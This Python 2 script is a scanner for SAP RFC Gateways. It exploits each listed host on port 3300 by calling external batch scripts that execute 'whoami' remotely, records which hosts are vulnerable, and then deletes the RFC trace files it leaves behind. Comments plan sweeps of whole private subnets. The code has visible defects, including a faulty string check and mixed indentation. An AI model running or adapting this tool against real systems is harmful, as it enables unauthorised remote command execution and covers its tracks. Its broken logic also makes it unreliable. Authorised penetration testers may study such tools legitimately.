# a scanner for vulnerable SAP RFC Gateways

import subprocess 
import os 
import sys
import time
import glob

#os.system('cls') # on windows
result_os = ' '
whoami = ' '
vulnerable = ' '
sys.tracebacklimit = 0
if sys.argv[1:]:
    print "File: %s" % (sys.argv[1])
    logfile = sys.argv[1]
else:
    logfile = raw_input("Please specify inputfie with RFC Gateway IPadresses: ")

input = open(logfile, "r")
	
#TODO: 	Give option to import the logon.ini file and loop over that
#		Option for Hail mary and do all private subnets
#		Smart scan for example via DNS/AD?

timestr = time.strftime("%Y%m%d-%H%M%S")
myFile = 'SAP_systems%s.txt' % timestr
file = open(myFile,"a") 


def shell(command):
    try:
        result = ' '
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        if not ("WaitForSingleObject" or "Can't exec external program") in result:
            result = (result[30:68])
            global whoami
            global vulnerable
            vulnerable = 'VULNERABLE'
            whoami = ''.join(result)
#            for items in result:
#                print (items)
#            result = [item.rstrip('\r\n') for item in result]
        else:
		return
    except Exception, e:
        result = ("Gateway is not exploitable.")
        whoami = ''.join(result)
        vulnerable = 'NON-VULNERABLE'
    print "%s %s %s %s %s %s %s %s" % ("[*] Host", line.rstrip(), "has a", vulnerable, "RFC Gateway running on port", '3300', "Output:", whoami.rstrip())
#    print "%s %s %s %s %s %s" % ("[*] Host", host.rstrip(), "has a vulnerable RFC Gateway running on port", port, "Output:", result.rstrip())
    print >>file, ("%s %s %s %s %s %s %s %s" % ("[*] Host", line.rstrip(), "has a", vulnerable, "RFC Gateway running on port", '3300', "Output:", whoami.rstrip()))
    del result
    return


	
if __name__ == "__main__":
# STEP 2: WHEN SAP GATEWAY PORTS ARE FOUND CHECK IF VULNERABLE
    for line in input.readlines() :
        cmd = (['EXEC_OS_CMD_interactive_WIN.bat', line.rstrip(), '3300', 'whoami'])
        shell(cmd)
        cmd = (['EXEC_OS_CMD_interactive_LIN.bat', line.rstrip(), '3300', 'whoami'])
        shell(cmd)
file.close() 

#Delete all RFC Trace files
for f in glob.glob("rfc*.trc"):
    os.remove(f)
